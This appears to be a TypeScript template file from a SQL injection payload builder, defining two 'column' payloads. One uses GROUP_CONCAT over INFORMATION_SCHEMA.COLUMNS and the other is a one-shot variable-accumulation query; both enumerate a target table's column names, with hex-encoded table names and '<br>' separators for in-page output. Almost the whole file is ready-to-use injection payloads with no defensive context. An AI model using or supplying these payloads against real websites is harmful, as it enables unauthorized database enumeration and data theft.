import { BuilderSubcategory, TemplateConfig } from '../../types';

export const columnTemplates: TemplateConfig[] = [
  {
    id: 'column-name-group-concat',
    name: 'COLUMN_NAME group_concat()',
    description: 'Column group_concat template configuration',
    content: '(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME=0x7461626c655f6e616d65)', // MANUALLY INSERT TEMPLATE TEXT HERE
    parameters: [
      {
        id: 'table_name',
        label: 'Table name',
        defaultValue: 'table_name',
        inputType: 'text'
      }
    ]
  },
  {
    id: 'column-name-one-shot',
    name: 'COLUMN_NAME one shot()',
    description: 'Column one shot template configuration',
    content: '(SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.COLUMNS)WHERE(TABLE_NAME=0x7461626c655f6e616d65)AND(0x00)IN(@x:=concat(@x,CONCAT(LPAD(@NR:=@NR%2b1,2,0x30),0x3a20,column_name,0x3c62723e)))))x)', // MANUALLY INSERT TEMPLATE TEXT HERE
    parameters: [
      {
        id: 'table_name',
        label: 'Table name',
        defaultValue: 'table_name',
        inputType: 'text'
      }
    ]
  }
];

export const columnSubcategory: BuilderSubcategory = {
  id: 'column',
  label: 'Column',
  description: 'Column template configuration and parameter definitions',
  templates: columnTemplates
};
